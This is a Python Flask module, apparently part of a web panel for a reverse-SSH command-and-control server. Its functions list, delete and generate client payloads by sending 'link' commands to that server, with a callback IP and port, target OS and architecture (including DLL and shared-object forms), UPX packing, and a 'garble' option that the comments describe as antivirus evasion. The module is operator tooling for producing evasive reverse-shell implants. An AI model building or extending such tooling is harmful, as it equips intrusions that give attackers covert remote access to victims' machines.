'''
    客户端生成相关方法
'''

from flask import current_app
from const import compiled_clients_file_path, support_os_arch_list
from category.rssh import rssh_client
import json
import os
import time
import re
import ipaddress


def get_compiled_clients_list():
    '''
        从json文件中获取已生成的客户端数据
    '''
    compiled_clients_list = []
    json_path = compiled_clients_file_path + '/description.json'
    with open(json_path, 'r') as f:
        clients_dict = json.loads(f.read())
    for filename in clients_dict.keys():
        file_path = compiled_clients_file_path + '/' + clients_dict[filename]['Path'].split('/')[-1]
        tim = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(float(os.stat(file_path).st_mtime)))
        tmp_dict = {'filename': filename,
                    'address': clients_dict[filename]['CallbackAddress'],
                    'os': clients_dict[filename]['Goos'],
                    'arch': clients_dict[filename]['Goarch'],
                    'filetype': clients_dict[filename]['FileType'],
                    'size': str(os.stat(file_path).st_size),
                    'version': clients_dict[filename]['Version'].split('-')[0],
                    'time': tim}
        compiled_clients_list.append(tmp_dict)
    return compiled_clients_list


def sorttime(dic):
    '''
        嵌套列表字典排序
    '''
    return dic['time']


def handle_compiled_clients(source_list, search_text):
    '''
        对全部已生成客户端数据进行处理，返回处理后的客户端数据（搜索和排序）
    '''
    # 数据搜索
    if search_text != '':
        search_list = []
        for l in source_list:
            for e in l.values():
                if search_text.lower() in e.lower():
                    search_list.append(l)
                    break
        source_list = search_list

    # 嵌套列表字典排序
    source_list.sort(key=sorttime, reverse=True)
    return source_list


def get_real_filename(filename):
    '''
        根据客户端文件名找到真实文件名
    '''
    json_path = compiled_clients_file_path + '/description.json'
    with open(json_path, 'r') as f:
        clients_dict = json.loads(f.read())
    real_path = compiled_clients_file_path + '/' + clients_dict[filename]['Path'].split('/')[-1]
    return real_path


def deleteCompileClient(key_file, rssh_ip, rssh_port, filename):
    '''
        删除已生成客户端
    '''
    try:
        with rssh_client(key_file, rssh_ip, rssh_port) as rssh_target:
            try:
                rssh_target.connect_rssh()
            except Exception as e:
                current_app.logger.exception(e)
                return {'stat': 'failed', 'result': 'Rssh Connect Error'}
            delete_cmd = 'link -r ' + filename
            delete_result = rssh_target.exec_command(delete_cmd)
            if delete_result['stat'] == 'success':
                if 'Removed' in delete_result['result']:
                    return delete_result
                else:
                    return {'stat': 'failed', 'result': delete_result['result']}
            else:
                return delete_result
    except Exception as e:
        current_app.logger.exception(e)
        return {'stat': 'failed', 'result': 'Key File Error'}


def check_compile_input(filename, address, port, os_arch, upx, garble):
    '''
        检查生成客户端Payload提交的输入是否合法
    '''
    try:
        # 检查文件名，只能包含大小写英文字母、数字、下划线和点
        if bool(re.match("^[A-Za-z0-9_.]*$", filename)) == False or filename == '':
            return {'stat': 'failed', 'result': '文件名只能包含大小写英文字母、数字、下划线和点'}
        # 检查回连地址是否合法
        try:
            ipaddress.ip_address(address)
        except:
            return {'stat': 'failed', 'result': '回连地址不合法'}
        # 检查回连端口是否合法
        if bool(re.match("^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$", port)) == False:
            return {'stat': 'failed', 'result': '回连端口不合法'}
        # 检查系统架构是否在支持列表中
        if os_arch not in support_os_arch_list:
            return {'stat': 'failed', 'result': '系统架构不支持'}
        # 检查upx是否合法
        if upx not in [True, False]:
            return {'stat': 'failed', 'result': '压缩参数不合法'}
        # 检查garble是否合法
        if garble not in [True, False]:
            return {'stat': 'failed', 'result': '免杀参数不合法'}
        make_input_dict = {
            'filename': filename,
            'address': address,
            'port': port,
            'os_arch': os_arch,
            'upx': upx,
            'garble': garble
        }
        return {'stat': 'success', 'result': make_input_dict}
    except Exception as e:
        current_app.logger.exception(e)
        return {'stat': 'failed', 'result': '异常错误，参数校验不通过'}


def makeClient(key_file, rssh_ip, rssh_port, make_input_dict):
    '''
        生成客户端Payload
    '''
    try:
        with rssh_client(key_file, rssh_ip, rssh_port) as rssh_target:
            try:
                rssh_target.connect_rssh()
            except Exception as e:
                current_app.logger.exception(e)
                return {'stat': 'failed', 'result': 'Rssh Connect Error'}
            upx = '--upx' if make_input_dict['upx'] else ''
            garble = '--garble' if make_input_dict['garble'] else ''
            os, arch = make_input_dict['os_arch'].split('/')
            if (os == 'windows' and arch == 'dll') or (os == 'linux' and arch == 'so'):
                make_cmd = 'link --name ' + make_input_dict['filename'] + ' --goos ' + os + ' --shared-object -s ' + \
                           make_input_dict['address'] + ':' + make_input_dict['port'] + ' ' + upx + ' ' + garble
            else:
                make_cmd = 'link --name ' + make_input_dict['filename'] + ' --goos ' + os + ' --goarch ' + arch + ' -s ' + \
                           make_input_dict['address'] + ':' + make_input_dict['port'] + ' ' + upx + ' ' + garble
            current_app.logger.info('Make client Cmd: ' + str(make_cmd))
            make_result = rssh_target.exec_command(make_cmd)
            if make_result['stat'] == 'success':
                if 'http' in make_result['result']:
                    return make_result
                else:
                    return {'stat': 'failed', 'result': make_result['result']}
            else:
                return make_result
    except Exception as e:
        current_app.logger.exception(e)
        return {'stat': 'failed', 'result': 'Key File Error'}